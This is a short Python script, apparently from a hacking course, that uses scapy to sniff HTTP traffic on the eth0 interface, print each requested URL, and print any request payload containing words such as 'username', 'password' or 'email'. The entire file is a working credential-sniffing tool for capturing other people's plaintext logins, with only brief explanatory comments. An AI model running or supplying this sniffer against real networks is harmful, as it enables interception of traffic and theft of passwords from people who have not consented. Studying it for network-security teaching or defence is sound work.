#!/usr/bin/env python

import scapy.all as scapy
from scapy_http import http

'''
    sniff packets. Interface should be passed as an argument
'''
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #can use argument filter to filter out packets of data eg:filter="udp

'''
    used to return the url of a HTTP request
    HTTP request resides inside the http layer and it has Host and Path as properties
    packets can be viewed using packet.show() method
'''
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

'''
    used to return login information
    
'''
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load                                                   #these info resides inside a layer called Raw layer usually after the HTTP layer
        keywords = ["username", "user", "login", "password", "pass", "email", "mail"]   #possible variable names
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")

